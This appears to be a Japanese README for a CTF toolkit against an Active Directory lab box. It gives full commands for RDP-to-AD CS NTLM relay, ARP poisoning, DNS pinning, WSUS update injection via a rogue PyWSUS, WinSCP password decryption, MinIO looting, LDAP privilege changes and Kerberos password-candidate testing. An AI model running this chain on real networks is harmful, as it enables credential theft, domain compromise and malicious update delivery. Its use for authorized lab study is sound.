# Insane X01 ツール

許可された Hack The Box、CTF、検証環境でのみ使用する補助ツール集です。各ツールは単独で動作し、攻略全体を自動化するものではありません。

> [!IMPORTANT]
> この文書の `192.0.2.0/24` は RFC 5737 の文書用ネットワーク、`lab.example` は例示用ドメインです。そのままでは接続できません。IP アドレス、ホスト名、インターフェース名、ユーザー名、DN、資格情報、MAC アドレス、ファイルパスを、許可された対象の値へ置き換えてください。

## 収録物

|ファイル|用途|主な副作用|
|---|---|---|
|`web_bootstrap.py`|Roundcube を介した osTicket アカウントの登録、メール確認、ログイン|アカウント作成、cookie と HTML の保存|
|`arp_probe.py`|IPv4 アドレス割り当て前の RFC 5227 形式 ARP 重複確認|ARP probe を2回送信|
|`rdp_adcs_relay.sh`|送信元を制限した RDP NTLM から AD CS Web Enrollment への relay|一時 IP、iptables 規則、証明書要求|
|`ldap_set_uac.py`|期待値で保護した `userAccountControl` の置換と再確認|AD ユーザー属性の変更|
|`winscp_decrypt.py`|WinSCP INI の16進 `Password` 値の復号|標準出力に平文を表示|
|`minio_loot.py`|MinIO の全 bucket/object の列挙と保存|オブジェクトをローカルへ保存|
|`decrypt_crd.py`|12-byte header を持つ CRD container の AES-CBC 復号|復号結果をファイルへ保存|
|`ldap_add_group_member.py`|指定ユーザーの AD group membership 追加と再確認|AD group membership の変更|
|`arp_poison.py`|指定 victim だけに spoofed ARP reply を定期送信|victim の ARP cache を一時変更|
|`dns_pin_internal.py`|指定 A record の固定、内部 zone の転送、外部名の NXDOMAIN 応答|UDP DNS listener を起動|
|`wsus_hybrid_proxy.py`|正規 WSUS 応答へ PyWSUS の `NewUpdates` fragment を注入|TLS proxy、更新 metadata の変更、通信保存|
|`pywsus-advertise-url.patch`|PyWSUS の bind URL と client 広告 URL の分離|PyWSUS source tree を変更|
|`autoupdate_detect_impersonated.ps1`|指定ユーザー token で Windows Update 検出を開始|対象端末で更新検出を実行|
|`predict_vbs_token.vbs`|指定 seed から対象と同じ32文字列を生成|なし|
|`test_kinit_candidates.py`|候補を `kinit` と一時 ccache で並列検証|KDC へ認証要求、合致候補を表示|

## サンプル構成

以降のコマンドでは、次の文書用構成を使用します。

|役割|サンプル値|
|---|---|
|中継ホスト|`192.0.2.128`|
|DC / AD CS / WSUS / MinIO|`192.0.2.32`, `dc01.lab.example`|
|Windows client|`192.0.2.64`|
|一時 RDP alias|`192.0.2.37`|
|内部 domain / Kerberos realm|`lab.example` / `LAB.EXAMPLE`|
|Webmail / ticket system|`mail.lab.example` / `ticket.lab.example`|

`<MAIL_PASSWORD>`、`<NT_HASH>`、`<WINSCP_HEX>` のような山括弧の値はプレースホルダーです。山括弧を含めずに実値へ置き換えます。

## 導入

### Python 環境

Python 3 の仮想環境を作成し、Python helper の依存パッケージを導入します。

```bash
cd /path/to/Tool4HTB/InsaneX01
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

`requirements.txt` は検証済みの Python dependency version を固定しています。

用途に応じて次の外部コマンドも必要です。

- network helper: `ip`、`ss`、`iptables`、`curl`、`timeout`。`arping` は任意です。
- Kerberos 検証: `proxychains4`、MIT Kerberos の `kinit`。
- VBS 再現: Windows Script Host、または Wine の `cscript` と `winepath`。
- Windows Update 検出: 対象 Windows 上の PowerShell。
- relay: RDP relay 対応 Impacket checkout。
- WSUS: GoSecure PyWSUS checkout、TLS certificate/key、PyWSUS が出力する `NewUpdates` fragment。

### 互換性を確認した外部 source

RDP relay script は、次の Impacket revision を想定しています。

```bash
mkdir -p vendor
git clone https://github.com/fortra/impacket.git vendor/impacket-rdp
git -C vendor/impacket-rdp checkout c456746d7a0f0bb25e8968a59f25aae1ad519935
python3 -m venv vendor/impacket-rdp/.venv
vendor/impacket-rdp/.venv/bin/python -m pip install ./vendor/impacket-rdp
```

PyWSUS patch は次の revision 向けです。別 revision では、必ず差分をレビューしてください。

```bash
git clone https://github.com/GoSecure/pywsus.git vendor/pywsus
git -C vendor/pywsus checkout 60c8b81bbe751ff11edf046776cba78347a8c7ff
git -C vendor/pywsus apply --check "$PWD/pywsus-advertise-url.patch"
git -C vendor/pywsus apply "$PWD/pywsus-advertise-url.patch"
```

## 使用方法

### 1. `web_bootstrap.py`

live form から CSRF token と randomized field name を取得し、osTicket 登録、Roundcube での activation mail 確認、osTicket login を順に行います。

```bash
install -d -m 0700 out/web
python web_bootstrap.py \
  --mail http://mail.lab.example \
  --ticket http://ticket.lab.example \
  --email demo.user@lab.example \
  --display-name 'Example User' \
  --phone '5550100' \
  --mail-password '<MAIL_PASSWORD>' \
  --ost-password '<NEW_TICKET_PASSWORD>' \
  --cookie-out out/web/ost.cookie \
  --evidence-dir out/web/evidence
```

成功時は `registration=accepted`、`roundcube=authenticated`、`activation=confirmed`、`osticket=authenticated` が順に表示され、`out/web/ost.cookie` に `OSTSESSID` が保存されます。標準出力の activation URL、cookie、保存 HTML には token や個人情報が含まれ得るため、共有しないでください。

### 2. `arp_probe.py`

アドレスを interface に追加する前に実行します。root または `CAP_NET_RAW` が必要です。

```bash
sudo .venv/bin/python arp_probe.py eth1 192.0.2.37 --timeout 3
```

`available=192.0.2.37` と終了コード `0` なら応答なし、`duplicate=...` と終了コード `1` なら競合ありです。probe が成功しても、対象 LAN の運用ルールを確認してからアドレスを割り当ててください。

### 3. `rdp_adcs_relay.sh`

一時 alias への RDP 接続を AD CS Web Enrollment へ relay します。root で実行し、`OUT` と同名の既存 log/loot がないことを確認します。

```bash
sudo env \
  IMPACKET_DIR="$PWD/vendor/impacket-rdp" \
  PYTHON_BIN="$PWD/vendor/impacket-rdp/.venv/bin/python" \
  IFACE=eth1 \
  ALIAS_IP=192.0.2.37 \
  SOURCE_IP=192.0.2.64 \
  ADCS_URL=http://192.0.2.32/certsrv/ \
  RDP_PORT=3389 \
  CERT_TEMPLATE=User \
  WINDOW_SECONDS=120 \
  OUT=/tmp/rdp-adcs-demo \
  OUTPUT_OWNER=operator \
  sh ./rdp_adcs_relay.sh
```

script は alias の重複、TCP/3389 listener、AD CS の NTLM 応答を事前確認します。`terminal_result=certificate_issued` と PFX の SHA-256 が成功判定です。終了・割り込み時は trap が alias と追加した iptables 規則を削除します。次も確認してください。

```bash
ip -o address show dev eth1
sudo iptables -S INPUT
ss -lnt | awk '$4 ~ /:3389$/'
```

`OUTPUT_OWNER` は中継ホスト上に存在する非 root アカウントへ置き換えます。発行された PFX と relay log は秘密情報です。

### 4. `ldap_set_uac.py`

現在値が `--expect` と完全一致する場合だけ `userAccountControl` を `--set` へ置換し、再読取します。

```bash
proxychains4 -q -f ./proxychains.conf python ldap_set_uac.py \
  --host 192.0.2.32 \
  --port 389 \
  --user 'LAB\demo.operator' \
  --hashes '<LM_HASH>:<NT_HASH>' \
  --dn 'CN=demo.user,OU=Lab Users,DC=lab,DC=example' \
  --expect 514 \
  --set 512
```

`before=514`、成功した LDAP result、`after=512` を確認します。これは対象 AD を変更します。復旧が必要なら、変更後の値を `--expect`、記録した変更前の値を `--set` に指定して再実行し、再読取してください。

### 5. `winscp_decrypt.py`

WinSCP INI の16進 `Password` 値を復号し、enhanced 形式では user と host の prefix を除去します。

```bash
python winscp_decrypt.py '<WINSCP_HEX>' demo.user 192.0.2.32
```

`password=` 行が結果です。入力した username/hostname が保存時の値と違う場合は prefix 検証に失敗します。標準出力を log へ残すと平文資格情報が保存されるため注意してください。

### 6. `minio_loot.py`

認証可能な全 bucket と object を列挙し、`--out` 配下へ保存します。server と実行端末に時刻差がある場合だけ、符号付き秒数を `--clock-offset` に指定します。

```bash
install -d -m 0700 out/minio
proxychains4 -q -f ./proxychains.conf python minio_loot.py \
  --endpoint 192.0.2.32:9000 \
  --access-key '<MINIO_ACCESS_KEY>' \
  --secret-key '<MINIO_SECRET_KEY>' \
  --clock-offset 0 \
  --out out/minio
```

出力の `BUCKET` と `OBJECT` を確認します。HTTPS endpoint では `--secure` を追加します。object 名が `--out` 外へ抜ける場合は保存を拒否します。取得物には秘密情報が含まれ得ます。

### 7. `decrypt_crd.py`

12-byte clear header、AES-CBC ciphertext、68-byte footer を持つ container を復号します。

```bash
install -d -m 0700 out/crd
python decrypt_crd.py sample.crd '<CONTAINER_PASSWORD>' out/crd/plain.bin
```

`valid_padding=True` と `wrote=...` が成功判定です。この helper は footer の HMAC 完全検証を主張せず、有効な PKCS#7 padding を password/container の判定材料にします。出力を信頼する前に、ファイル形式や既知 marker も確認してください。

### 8. `ldap_add_group_member.py`

指定 group を検索し、指定 DN を `member` に追加して linked value を再読取します。group は `--group` で明示します。

```bash
proxychains4 -q -f ./proxychains.conf python ldap_add_group_member.py \
  --host 192.0.2.32 \
  --port 389 \
  --user 'LAB\svc.demo' \
  --password '<LDAP_PASSWORD>' \
  --base 'DC=lab,DC=example' \
  --group 'LabOperators' \
  --user-dn 'CN=svc.demo,OU=Service Accounts,DC=lab,DC=example'
```

`modify=True` または `modify=already_present` の後、`after_member` に指定 DN があることを確認します。この helper に削除機能はありません。変更前 membership を保存し、必要な復旧は承認済み管理手段で行ってください。

### 9. `arp_poison.py`

victim に対し、`SPOOF_IP` の MAC が実行ホストの MAC であるという ARP reply を2秒間隔で送ります。最後の `REAL_SPOOF_MAC` を渡すと、終了時に正しい mapping を5回通知します。

```bash
sudo .venv/bin/python arp_poison.py \
  eth1 \
  192.0.2.64 \
  192.0.2.32 \
  02:00:00:00:00:64 \
  02:00:00:00:00:32
```

開始時に victim、spoof IP、実行ホスト MAC が表示されます。`Ctrl-C` または `SIGTERM` で停止し、`restored ...` を確認してください。安全な復旧のため、可能な限り実ホストの MAC を第5引数として渡します。

### 10. `dns_pin_internal.py`

`--pin-name` の A query だけを `--pin-ip` で返し、`--zone` 内の他 query を内部 DNS へ転送し、それ以外を NXDOMAIN にします。

```bash
sudo .venv/bin/python dns_pin_internal.py \
  --listen-ip 192.0.2.128 \
  --listen-port 5353 \
  --upstream 192.0.2.32 \
  --upstream-port 53 \
  --zone lab.example \
  --pin-name dc01.lab.example \
  --pin-ip 192.0.2.32 \
  --ttl 60
```

置換後の実環境では、別端末から次のように応答を確認できます。

```bash
dig @192.0.2.128 -p 5353 dc01.lab.example A
dig @192.0.2.128 -p 5353 _ldap._tcp.dc._msdcs.lab.example SRV
dig @192.0.2.128 -p 5353 public.example A
```

この helper 自体は NAT/REDIRECT 規則を追加しません。別途追加した規則は PID とともに記録し、停止時に削除してください。

### 11. `wsus_hybrid_proxy.py`

TLS で client を受け、通常は正規 WSUS へ転送します。`--fragment` が存在すると、対象となる `SyncUpdates` 応答へ `NewUpdates` element を1回挿入し、関連 metadata/content/reporting を rogue PyWSUS へ転送します。

```bash
install -d -m 0700 out/wsus-capture
sudo .venv/bin/python wsus_hybrid_proxy.py \
  --listen 192.0.2.128 \
  --port 8531 \
  --upstream 192.0.2.32 \
  --upstream-port 8531 \
  --host-header dc01.lab.example:8531 \
  --rogue-host 127.0.0.1 \
  --rogue-port 18080 \
  --cert dc01.lab.example.crt \
  --key dc01.lab.example.key \
  --fragment out/NewUpdates.xml \
  --capture out/wsus-capture
```

証明書は client が接続する名前と一致し、信頼されている必要があります。fragment を作る前は正規転送だけになり、作成後は log の `injected=True` が注入成功の判断点です。停止は `Ctrl-C` で行い、外部で構成した ARP、DNS、NAT、forwarding、PyWSUS process も個別に復旧・停止してください。capture には端末情報が含まれ得ます。

### 12. `pywsus-advertise-url.patch`

PyWSUS が listen する URL と client に広告する URL を分離します。適用前に対象 revision と clean tree を確認します。

```bash
git -C vendor/pywsus status --short
git -C vendor/pywsus apply --check "$PWD/pywsus-advertise-url.patch"
git -C vendor/pywsus apply "$PWD/pywsus-advertise-url.patch"
python vendor/pywsus/pywsus.py --help | grep -F -- '--advertise-url'
```

元に戻す必要がある場合は、作業 tree に他の変更がないことを確認してから、同 patch を reverse 適用します。

```bash
git -C vendor/pywsus apply --reverse --check "$PWD/pywsus-advertise-url.patch"
git -C vendor/pywsus apply --reverse "$PWD/pywsus-advertise-url.patch"
```

### 13. `autoupdate_detect_impersonated.ps1`

指定 domain user で interactive logon token を作り、その token で `Microsoft.Update.AutoUpdate.DetectNow()` を呼びます。対象 Windows の PowerShell で実行します。

```powershell
powershell.exe -ExecutionPolicy Bypass -File .\autoupdate_detect_impersonated.ps1 `
  -User 'demo.user' `
  -Domain 'lab.example' `
  -Password '<WINDOWS_PASSWORD>' `
  -WaitSeconds 12
```

`identity=...`、`autoupdate=created`、`detectNow=returned`、`observation_wait=complete` を確認します。script は `finally` で impersonation を解除して token handle を閉じますが、開始済みの更新検出は取り消しません。

### 14. `predict_vbs_token.vbs`

1 process につき1 seed を渡します。Windows では次のように実行します。

```powershell
cscript.exe //nologo .\predict_vbs_token.vbs 1234.567
```

Wine を使う場合は次のとおりです。

```bash
wine cscript //nologo "$(winepath -w ./predict_vbs_token.vbs)" 1234.567
```

成功時の形式は `0:<32文字>` です。多数の seed を試す場合も、対象 KDC への認証試行数と lockout policy を先に確認してください。

### 15. `test_kinit_candidates.py`

1行1候補の UTF-8 text を読み、`proxychains4` 経由の native `kinit` と一時 ccache で検証します。

```bash
install -d -m 0700 out/kerberos
printf '%s\n' '<CANDIDATE_1>' '<CANDIDATE_2>' > out/kerberos/candidates.txt
chmod 0600 out/kerberos/candidates.txt
python test_kinit_candidates.py out/kerberos/candidates.txt \
  --principal demo.user@LAB.EXAMPLE \
  --krb5-config ./krb5.conf \
  --proxychains ./proxychains.conf \
  --proxychains-bin proxychains4 \
  --workers 4
```

全候補を結論付きで試し、合致がちょうど1件のときだけ `MATCH=...` と終了コード `0` を返します。timeout が1件でもあれば error、合致が0件または複数なら非0終了です。合致候補が標準出力に出るため、log の権限と保存期間を制限してください。`--workers` は domain の lockout policy と許可された試行量に合わせます。

## 実行前後の共通確認

実行前:

1. 対象、送信元、interface、経路、名前解決が許可範囲内か確認する。
2. `python TOOL.py --help` または script 冒頭の usage を確認する。
3. AD 属性、group membership、IP address、iptables、forwarding、listener の変更前状態を保存する。
4. cookie、PFX、hash、平文、復号物、packet/capture の保存先を `0700` directory にし、共有範囲を決める。
5. lockout policy、証明書発行、更新配布など target-side の不可逆または持続的な影響を確認する。

実行後:

1. 各節の成功 marker と終了コードを確認する。
2. 一時 alias、iptables/NAT 規則、ARP mapping、DNS/WSUS listener、proxy、tmux/background process を再確認して停止・復旧する。
3. AD/CA/WSUS に残る変更を記録し、許可された方法で必要な復旧を行う。
4. 秘密を含む出力を `0600` 相当にし、不要になった一時ファイルは組織の手順に従って削除する。

代表的なローカル確認例です。

```bash
ip -brief address
sudo iptables-save
ss -lntup
ps -ef | grep -E '[r]dp_adcs_relay|[w]sus_hybrid_proxy|[d]ns_pin_internal|[a]rp_poison'
find out -type f -exec chmod 0600 {} +
```

## 制限事項

- サンプル値では通信できません。実行前にすべての例示値を置換してください。
- target の version、patch、設定、権限関係が異なれば同じ結果にはなりません。
- `ldap_set_uac.py` と `ldap_add_group_member.py` は AD を変更し、`rdp_adcs_relay.sh` は証明書要求を残し得ます。
- `wsus_hybrid_proxy.py` は ARP/DNS/NAT や PyWSUS の lifecycle を管理しません。
- 復号・候補生成の成功だけでは、取得物の真正性や現在も有効な資格情報であることを保証しません。
